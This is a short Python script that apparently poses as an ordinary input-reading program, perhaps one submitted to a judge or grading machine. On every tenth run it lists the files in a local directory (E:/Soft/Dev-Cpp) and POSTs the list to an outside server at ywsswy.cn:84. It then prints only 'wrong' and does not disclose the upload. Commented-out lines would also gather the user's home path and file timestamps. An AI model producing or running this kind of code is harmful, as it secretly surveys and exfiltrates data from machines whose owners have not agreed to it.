import urllib.request
import os
import datetime
num = 0
with open('E:/Soft/Dev-Cpp/yg.txt', 'r') as f:
    num = int(f.read())
    num += 1
with open('E:/Soft/Dev-Cpp/yg.txt', 'w') as f:
    f.write(str(num))
if int(num%10) != 0:
    exit()
data_list = []
while True:
    try:
        temp = input()
    except EOFError:
        break
#data_list.append('本文件目录：{}'.format(os.path.abspath(__file__)))
#data_list.append('用户目录：{}'.format(os.path.expanduser('~')))
try:
    path = 'E:/Soft/Dev-Cpp'
    for file in os.listdir(path):
        file_path = os.path.join(path, file)
        data_list.append(file_path)
        #timestamp = os.path.getmtime(file_path)
        #data_list.append(''.join([str(datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')),'\t\t',file_path]))
except Exception as mye:
    data_list.append('异常信息：{}'.format(str(mye)))
import json
data = json.dumps(data_list)
data = 'input={}'.format(data)
data = data.encode('utf-8')
url = 'http://ywsswy.cn:84'
req = urllib.request.Request(url) 
req.add_header('Content-Type', 'application/x-www-form-urlencoded;charset=utf-8')
res = urllib.request.urlopen(req, data).read()
print('wrong')
